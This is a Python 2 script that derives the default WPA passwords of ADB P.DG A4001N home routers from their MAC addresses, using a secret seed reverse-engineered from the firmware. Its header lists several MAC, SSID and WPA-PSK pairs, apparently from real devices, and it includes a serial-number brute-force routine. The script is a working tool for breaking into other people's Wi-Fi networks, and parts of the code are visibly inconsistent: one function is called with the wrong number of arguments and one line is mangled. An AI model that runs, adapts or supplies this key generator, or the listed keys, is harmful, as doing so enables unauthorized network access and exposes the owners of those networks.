#!/usr/bin/env python
# -*- coding: utf-8 -*-

# www.ednolo.alumnos.upv.es

'''

Productor : ADB Broadband S.p.A.
Router    : Home Station ADSL ADB P.DG A4001N

MAC     : DC:0B:1A:8A:21:62
SSID    : WLAN_2161
WPA-PSK : a0w1NfDVZsGstbSkhAiT

MAC     : DC:0B:1A:81:C3:B5
SSID    : WLAN_C35B
WPA-PSK : sdRKCNNVWImFYBU3mRmQ

MAC     : 30:39:F2:6B:21:A1
SSID    : WLAN_21A1
WPA-PSK : IEna08sbsSbWtrPFX11H

MAC     : 30:39:F2:6B:7A:C9
SSID    : WLAN_7AC9
WPA-PSK : LxVpGk6wRzh0hhkYIaTd



April 27, 2013 Extraction firmware https://mega.co.nz/#!54MhnCqI!VZACdVsu7NboGQxUZwchaQSLscgaGYee1805rAyk8FE
April 28, 2013 Extraction firmware via USB  Thanks gscabi ;) 
May   12, 2013 Detect function 'generatekey' and magic seed via reverse engineering
May   13, 2013 Others routers have same seed (Alice in Italy) 
July  03, 2013 Start again! Finish exams! :P
'''

import re
import sys
import hashlib

VERSION     = 0
SUBVERSION  = 1
RELEASE     = 0
DATEVERSION = '2013/07/03' 
URL         = 'http://www.ednolo.alumnos.upv.es'


def gen_key(mac,stdout='True'):
    seed = ('\x64\xC6\xDD\xE3\xE5\x79\xB6\xD9\x86\x96\x8D\x34\x45\xD2\x3B\x15' +
            '\xCA\xAF\x12\x84\x02\xAC\x56\x00\x05\xCE\x20\x75\x91\x3F\xDC\xE8')

    lookup  = '0123456789ABCDEFGHIKJLMNOPQRSTUVWXYZabcdefghikjlmnopqrstuvwxyz'
    lookup1 = '0123456789abcdefghijklmnopqrstuvwxyz'
    
    h = hashlib.sha256()
    h.update(seed)
    h.update('1236790')
    h#.update('255500243969')
    h.update(mac)

    digest = bytearray(h.digest())

    if (stdout):
        print "[+] SHA256 : %s" % h.hexdigest()
        
    
    for r in range(len(lookup)):
        charset=lookup[r:]+lookup[:r]
        charset1=lookup1[r:]+lookup1[:r]
        print  '\t     '+''.join([charset[x % len(charset)] for x in digest[0:20]]) 
        #print  '\t     '+''.join([charset1[x % len(charset1)] for x in digest[0:20]])
    
	

    return ''.join([lookup[x % len(lookup)] for x in digest[0:20]])


def bruteforce(mac,l):
    
    if    (l == 7):  maxi = 10000000
    elif  (l == 8):  maxi = 100000000
    elif  (l == 9):  maxi = 1000000000
    elif  (l == 10): maxi = 10000000000
    elif  (l == 11): maxi = 100000000000
    elif  (l == 12): maxi = 1000000000000
    else: return
    
    psk = 'LxVpGk6wRzh0hhkYIaTd'
    for sn in xrange(0,maxi):
        sn1 = '2555'+str(sn).zfill(l)
        wpa =gen_key(mac,sn1,False)
        #print "sn: {0} wpa: {1}".format(str(sn).zfill(l),wpa)
        if (wpa.find(psk) != -1):
            print "got it!!! %s" % sn1
            return
        elif not (sn%1000000):
            print "[+] sn : {0}".format(str(sn1).zfill(l))
        
def banner():
    print ' --------------------------------------------------------------------'
    print '|                   ADB/Telekom  P.DGA4001N              (SPAIN)     |'
    print '|                 Default WPA Key Algorithm Weakness                 |'
    print '|                      *dudux && bucky 2013-5-12                     |'
    print ' --------------------------------------------------------------------'   
    print '%s %d.%d.%d    %s     [%s]\n\n' %(sys.argv[0], VERSION, SUBVERSION,RELEASE,DATEVERSION,URL)  

def main():

    banner()   
    if len(sys.argv) != 2:
        print '\tusage: %s [MAC]\n' %sys.argv[0]
        print '\teg. %s 30:39:F2:00:DE:AD'    %sys.argv[0]
        print '\t    %s DC:0B:1A:00:DE:AD\n'  %sys.argv[0]
        sys.exit()

    # Hardcoded! for testing /TODO
    sn = '255500243969'
    mac_str = re.sub(r'[^a-fA-F0-9]', '', sys.argv[1])
    if len(mac_str) != 12:
        sys.exit('[!] Check MAC format!\n')

    mac = bytearray.fromhex(mac_str)
        
    print '[+] SSID   : WLAN_%02X%02X' % ( mac[4], mac[5])
    print '[+] WPA key: %s' % (gen_key(mac))
    print '[*] WPA-PSK: LxVpGk6wRzh0hhkYIaTd'


    mac[5] += 1
    print ''
    print '[+] SSID   : WLAN_%02X%02X' % ( mac[4], mac[5])
    print '[+] WPA key: %s' % (gen_key(mac))
    print '[*] WPA-PSK: LxVpGk6wRzh0hhkYIaTd'

    mac[5] += 1
    print ''
    print '[+] based on BSSID:\n[+] SSID   : WLAN_%02X%02X' % ( mac[4], mac[5])
    print '[+] WPA key: %s' % (gen_key(mac))
    print '[*] WPA-PSK: LxVpGk6wRzh0hhkYIaTd'
    mac[5] += 1
    print ''
    print '[+] based on BSSID:\n[+] SSID   : WLAN_%02X%02X' % ( mac[4], mac[5])
    print '[+] WPA key: %s' % (gen_key(mac))
    print '[*] WPA-PSK: LxVpGk6wRzh0hhkYIaTd'
    mac[5] += 1
    print ''
    print '[+] based on BSSID:\n[+] SSID   : WLAN_%02X%02X' % ( mac[4], mac[5])
    print '[+] WPA key: %s' % (gen_key(mac))
    print '[*] WPA-PSK: LxVpGk6wRzh0hhkYIaTd'
      
     
    # print "[!] Bruteforce "
    # for l in (8,9):
    #     bruteforce(mac,l)


if __name__ == "__main__":
    main()

